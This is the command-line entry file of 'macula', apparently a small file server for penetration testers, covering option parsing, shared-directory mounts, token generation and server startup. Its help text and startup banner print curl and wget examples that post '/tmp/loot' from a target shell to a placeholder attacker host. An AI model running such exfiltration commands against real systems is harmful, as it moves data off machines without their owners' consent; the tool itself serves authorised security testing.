# file: macula/cli.py

"""Command-line interface and main entry point for macula."""
import argparse
import errno
import os
import signal
import ssl
import sys
import threading
import time
from pathlib import Path

from . import (CLIPBOARD_ENABLED,
               CLIPBOARD_MAX_MB_PER_ROOM, CLIPBOARD_MAX_ROOMS,
               CLIPBOARD_MAX_TOTAL_MB,
               DEFAULT_BIND, DEFAULT_MAX_UPLOAD, DEFAULT_PORT,
               MB,
               REPO_URL,
               make_clipboard_endpoint,
               make_handbook_endpoint,
               make_source_endpoint, make_token, make_upload_endpoint,
               __version__)
from .clipboard import ClipboardStore
from .renderers import render_text
from .server import MaculaHandler, MaculaServer
from .tree import build_listing_tree, build_virtual_root_tree
from .utils import fmt_max_upload, get_interface_ip, is_ipv4, parse_size

DEFAULT_DIR = os.path.expanduser("~")


def _resolve_mounts(dir_args, upload_path=None):
    roots = []
    for d in dir_args:
        p = Path(d).expanduser().resolve()
        if not p.exists():
            print(f"[!] Error: directory does not exist: {p}"); sys.exit(1)
        if not p.is_dir():
            print(f"[!] Error: not a directory: {p}"); sys.exit(1)
        if p not in roots:
            roots.append(p)

    upload_resolved = upload_path.resolve() if upload_path else None
    if upload_resolved is not None and upload_resolved not in roots:
        roots.append(upload_resolved)

    if len(roots) == 1:
        name = roots[0].name or "root"
        is_up = (upload_resolved is not None and roots[0] == upload_resolved)
        return [{
            "prefix": "/", "root": roots[0],
            "name": name, "display": name, "is_upload": is_up,
        }], False

    mounts = []
    used_names = set()
    for p in roots:
        is_up = (upload_resolved is not None and p == upload_resolved)
        base = p.name or "root"
        name = base
        i = 2
        while name in used_names:
            name = f"{base}_{i}"
            i += 1
        used_names.add(name)
        mounts.append({
            "prefix": "/" + name + "/", "root": p,
            "name": name, "display": name, "is_upload": is_up,
        })
    return mounts, True


def _display_host(resolved):
    if len(resolved) == 1 and resolved[0][0] != "0.0.0.0":
        return resolved[0][0]
    return "<host>"


def _token_is_shadowed(token, mounts):
    """True if `token` collides with a top-level name in any mount, or
    with any mount name itself. In that case a user path would shadow an
    internal endpoint (or vice versa), so we regenerate the token."""
    for m in mounts:
        if m.get("name") == token:
            return True
        try:
            candidate = Path(m["root"]) / token
        except Exception:
            continue
        try:
            if candidate.exists():
                return True
        except OSError:
            continue
    return False


def _make_token(mounts, attempts=10):
    """Generate a token that does not shadow any real path in the mounts."""
    for _ in range(attempts):
        tok = make_token()
        if not _token_is_shadowed(tok, mounts):
            return tok
    return make_token()


def main():
    parser = argparse.ArgumentParser(
        prog="macula",
        description=("macula — a small, zero-dependency file server "
                     "for pentesting."),
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            f"Project home: {REPO_URL}\n"
            "\n"
            "Upload examples from a target shell (requires -u and the token\n"
            "printed at startup, e.g. TOKEN=a1b2c3d4):\n"
            "  curl -X POST -F \"file=@/tmp/loot\" http://KALI:8000/a1b2c3d4/upload\n"
            "  curl --data-binary @/tmp/loot \"http://KALI:8000/a1b2c3d4/upload?name=loot\"\n"
            "  wget --post-file=/tmp/loot \"http://KALI:8000/a1b2c3d4/upload?name=loot\"\n"
        ),
    )
    parser.add_argument("filter", nargs="*", default=[],
        help="Keywords or wildcards to find files (e.g., peas, '*.exe')")
    parser.add_argument("-b", "--bind", action="append", default=None,
        help=f"Interface name, IPv4, or 'all'. Repeatable. Default: {DEFAULT_BIND}")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
        help=f"Listening port (default: {DEFAULT_PORT})")
    parser.add_argument("-d", "--dir", action="append", default=None,
        metavar="PATH",
        help="Directory to share. Repeatable: -d /a -d /b.\n"
             "One  -> served at /.\n"
             "Many -> each at /<basename>/ with a virtual root at /.\n"
             f"Default: {DEFAULT_DIR}")
    parser.add_argument("-c", "--client", default=None,
        help="Whitelist: allow only this IPv4 address")
    parser.add_argument("-D", "--depth", type=int, default=None,
        help="Max recursion depth for listing (0 = top-level only)")
    parser.add_argument("-u", "--upload-dir", default=None, metavar="PATH",
        help="Folder on the SERVER to receive uploaded files.")
    parser.add_argument("--max-upload-size", default=DEFAULT_MAX_UPLOAD,
        help=f"Max size per upload. 0 = unlimited. Default: {DEFAULT_MAX_UPLOAD}")
    parser.add_argument("--repo-url", default=None, metavar="URL",
        help="Override the project URL printed in the banner and linked "
             f"in the UI (default: {REPO_URL}).")
    parser.add_argument("--ssl", action="store_true",
        help="Enable HTTPS (requires --cert and --key).")
    parser.add_argument("--cert", default="cert.pem")
    parser.add_argument("--key",  default="key.pem")

    parser.add_argument("--no-clipboard", action="store_true",
        help="Disable the shared clipboard endpoint.")
    parser.add_argument("--clipboard-max-rooms", type=int,
        default=CLIPBOARD_MAX_ROOMS, metavar="N",
        help=f"Max number of clipboard rooms (default: {CLIPBOARD_MAX_ROOMS}).")
    parser.add_argument("--clipboard-max-mb", type=int,
        default=CLIPBOARD_MAX_MB_PER_ROOM, metavar="MB",
        help=f"Max MB per clipboard room (default: {CLIPBOARD_MAX_MB_PER_ROOM}).")
    parser.add_argument("--clipboard-max-total-mb", type=int,
        default=CLIPBOARD_MAX_TOTAL_MB, metavar="MB",
        help=f"Max total MB across all rooms "
             f"(default: {CLIPBOARD_MAX_TOTAL_MB}).")

    parser.add_argument("-v", "--version", action="version",
        version=f"macula {__version__} — {REPO_URL}")

    args = parser.parse_args()

    if args.depth is not None and args.depth < 0:
        print("[!] Error: --depth must be >= 0"); sys.exit(1)

    if args.clipboard_max_rooms < 1:
        print("[!] Error: --clipboard-max-rooms must be >= 1"); sys.exit(1)
    if args.clipboard_max_mb < 1:
        print("[!] Error: --clipboard-max-mb must be >= 1"); sys.exit(1)
    if args.clipboard_max_total_mb < 1:
        print("[!] Error: --clipboard-max-total-mb must be >= 1"); sys.exit(1)
    if args.clipboard_max_total_mb < args.clipboard_max_mb:
        print("[!] Warning: --clipboard-max-total-mb is smaller than "
              "--clipboard-max-mb; the first room may already exceed the "
              "total budget.")

    max_upload_size = parse_size(args.max_upload_size)
    if max_upload_size is None:
        print(f"[!] Error: invalid --max-upload-size: {args.max_upload_size!r}")
        sys.exit(1)

    binds = args.bind or [DEFAULT_BIND]
    resolved, seen_ips = [], set()
    for b in binds:
        if b.lower() == "all":
            ip, source = "0.0.0.0", "all interfaces (0.0.0.0)"
        elif is_ipv4(b):
            ip, source = b, f"IPv4 {b}"
        else:
            ip = get_interface_ip(b)
            if not ip:
                print(f"[!] Error: could not resolve IPv4 for '{b}'."); sys.exit(1)
            source = f"interface {b} ({ip})"
        if ip in seen_ips: continue
        seen_ips.add(ip)
        resolved.append((ip, source))
    if any(ip == "0.0.0.0" for ip, _ in resolved):
        resolved = [("0.0.0.0", "all interfaces (0.0.0.0)")]
    if not resolved:
        print("[!] Error: no valid bind addresses resolved."); sys.exit(1)

    upload_path = None
    if args.upload_dir:
        upload_path = Path(args.upload_dir).expanduser().resolve()
        if not upload_path.exists():
            print(f"[!] Error: upload directory does not exist: {upload_path}")
            print(f"[!] Create it first:\n    mkdir -p {upload_path}\n"); sys.exit(1)
        if not upload_path.is_dir():
            print(f"[!] Error: upload path is not a directory: {upload_path}")
            sys.exit(1)
        if not os.access(upload_path, os.W_OK):
            print(f"[!] Error: upload directory is not writable: {upload_path}")
            sys.exit(1)

    dir_args = args.dir if args.dir else [DEFAULT_DIR]
    mounts, multi = _resolve_mounts(dir_args, upload_path)

    token = _make_token(mounts)
    upload_endpoint = make_upload_endpoint(token)
    source_endpoint = make_source_endpoint(token)
    handbook_endpoint = make_handbook_endpoint(token)

    # CLIPBOARD_ENABLED is a tunable constant in __init__.py; the CLI flag
    # can only turn the clipboard off, never force it on when the constant
    # is False.
    clipboard_enabled = CLIPBOARD_ENABLED and (not args.no_clipboard)
    # The endpoint path is always reserved (dispatch in the handler uses it
    # to return the specific "Clipboard disabled" 404 documented in the
    # handbook). `clipboard_endpoint` for the UI is None when disabled.
    clipboard_endpoint_dispatch = make_clipboard_endpoint(token)
    if clipboard_enabled:
        clipboard_endpoint = clipboard_endpoint_dispatch
        clipboard_store = ClipboardStore(
            max_rooms=args.clipboard_max_rooms,
            max_bytes_per_room=args.clipboard_max_mb * MB,
            max_total_bytes=args.clipboard_max_total_mb * MB,
        )
    else:
        clipboard_endpoint = None      # UI hides the dropdown
        clipboard_store = None

    repo_url = args.repo_url or REPO_URL

    scheme = "https" if args.ssl else "http"
    ssl_context = None
    if args.ssl:
        try:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain(certfile=args.cert, keyfile=args.key)
        except (OSError, ssl.SSLError) as e:
            print(f"[!] TLS setup failed: {e}"); sys.exit(1)

    def handler(*a, **kw):
        return MaculaHandler(*a, directory=str(mounts[0]["root"]), **kw)

    host_display = _display_host(resolved)

    print()
    print(f"  \U0001F7E1 MACULA v{__version__} · file server")
    print(f"  {'─' * 60}")
    if multi:
        print(f"  mounts    {len(mounts)} entries (virtual root at /)")
        for m in mounts:
            tag = "upload" if m.get("is_upload") else "share "
            print(f"            [{tag}] {m['prefix']:<14} -> {m['root']}")
    else:
        print(f"  dir       {mounts[0]['root']}")
    for ip, source in resolved:
        print(f"  bind      {source}  ->  {scheme}://{ip}:{args.port}")
    if upload_path:
        print(f"  upload    {upload_path}  (also exposed as a share)")
    else:
        print(f"  upload    disabled  (pass -u /path to enable)")
    print(f"  max size  {fmt_max_upload(max_upload_size)}")
    print(f"  format    html (default) | json | text")
    if args.depth is not None:
        print(f"  depth     {args.depth}")
    print(f"  client    {args.client or 'any'}")
    if args.ssl:
        print(f"  tls       cert={args.cert} key={args.key}")
    if args.filter:
        print(f"  filter    {' OR '.join(args.filter)}")
    print(f"  {'─' * 60}")
    print(f"  \U0001F511 token     {token}")
    print(f"  \U0001F4C4 source:")
    print(f"     {scheme}://<host>:{args.port}{source_endpoint}?format=zip")
    print(f"     {scheme}://<host>:{args.port}{source_endpoint}?format=tgz")
    print(f"  \U0001F4D6 handbook:")
    print(f"     {scheme}://<host>:{args.port}{handbook_endpoint}?view=html")
    print(f"     {scheme}://<host>:{args.port}{handbook_endpoint}?view=text")
    if clipboard_enabled:
        print(f"  \U0001F4CB clipboard  "
              f"({args.clipboard_max_rooms} rooms max, "
              f"{args.clipboard_max_mb} MB/room, "
              f"{args.clipboard_max_total_mb} MB total):")
        print(f"     {scheme}://<host>:{args.port}{clipboard_endpoint}")
        print(f"     {scheme}://<host>:{args.port}{clipboard_endpoint}?id=1")
    else:
        print(f"  \U0001F4CB clipboard  disabled (--no-clipboard)")
    if upload_path:
        full_upload_url = f"{scheme}://<host>:{args.port}{upload_endpoint}"
        print(f"  \U0001F4E4 upload from a target  "
              f"(replace <host> with a bind IP above):")
        print(f"     curl -X POST -F \"file=@/tmp/loot\" {full_upload_url}")
        print(f"     curl --data-binary @/tmp/loot \"{full_upload_url}?name=loot\"")
        print(f"     wget --post-file=/tmp/loot \"{full_upload_url}?name=loot\"")
    print(f"  {'─' * 60}")
    print(f"  \U0001F517 repo      {repo_url}")
    print(f"  {'─' * 60}")

    if multi:
        preview_tree = build_virtual_root_tree(mounts, args.filter, args.depth)
        preview_dir  = "/ (virtual root)"
    else:
        preview_tree = build_listing_tree(mounts[0]["root"], args.filter,
                                          args.depth, share_root=mounts[0]["root"])
        preview_dir = mounts[0]["root"]
    base_url = f"{scheme}://{host_display}:{args.port}"
    print()
    print(render_text(preview_tree, preview_dir, base_url,
                      args.filter, args.depth,
                      upload_path=upload_path, mounts=mounts,
                      token=token,
                      upload_endpoint=upload_endpoint if upload_path else None,
                      source_endpoint=source_endpoint,
                      handbook_endpoint=handbook_endpoint,
                      clipboard_endpoint=clipboard_endpoint,
                      repo_url=repo_url), end="")
    print()
    print("---------------------------------------------------")
    print()

    servers = []
    failed_source = resolved[0][1]
    failed_ip = resolved[0][0]
    try:
        for ip, source in resolved:
            failed_ip, failed_source = ip, source
            httpd = MaculaServer((ip, args.port), handler,
                                 allowed_client=args.client)
            httpd.mounts             = mounts
            httpd.multi              = multi
            httpd.bindings           = resolved
            httpd.server_ip          = ip
            httpd.server_port        = args.port
            httpd.filters            = args.filter
            httpd.max_depth          = args.depth
            httpd.upload_dir         = upload_path
            httpd.max_upload_size    = max_upload_size
            httpd.scheme             = scheme
            httpd.token              = token
            httpd.upload_endpoint    = upload_endpoint if upload_path else None
            httpd.source_endpoint    = source_endpoint
            httpd.handbook_endpoint  = handbook_endpoint
            httpd.clipboard_endpoint = clipboard_endpoint_dispatch
            httpd.clipboard          = clipboard_store
            httpd.repo_url           = repo_url
            httpd._serving           = False
            if ssl_context is not None:
                httpd.socket = ssl_context.wrap_socket(httpd.socket,
                                                       server_side=True)
            servers.append(httpd)
    except OSError as e:
        for s in servers:
            try:
                s.server_close()
            except Exception:
                pass
        print()
        if e.errno == errno.EADDRINUSE:
            print(f"[!] Error: cannot bind {failed_source} — port "
                  f"{args.port} is already in use.")
            print(f"    Another process is listening on that port.")
            print(f"    Try a different one with -p <port>, or stop the "
                  f"other service.")
        else:
            msg = e.strerror or str(e)
            print(f"[!] Error: cannot bind {failed_source} — {msg}")
        sys.exit(1)
    except KeyboardInterrupt:
        for s in servers:
            try:
                s.server_close()
            except Exception:
                pass
        print("\n[+] macula stopped.")
        sys.exit(130)

    try:
        if len(servers) == 1:
            servers[0]._serving = True
            servers[0].serve_forever()
        else:
            for httpd in servers:
                httpd._serving = True
                threading.Thread(target=httpd.serve_forever,
                                 daemon=True).start()
            while True:
                time.sleep(3600)
    except KeyboardInterrupt:
        print("\n[+] macula stopped.")
    except OSError as e:
        print(f"\n[!] Server error: {e}"); sys.exit(1)
    finally:
        try:
            signal.signal(signal.SIGINT, signal.SIG_IGN)
        except (ValueError, OSError):
            pass
        for httpd in servers:
            if getattr(httpd, "_serving", False):
                try:
                    httpd.shutdown()
                except Exception:
                    pass
            try:
                httpd.server_close()
            except Exception:
                pass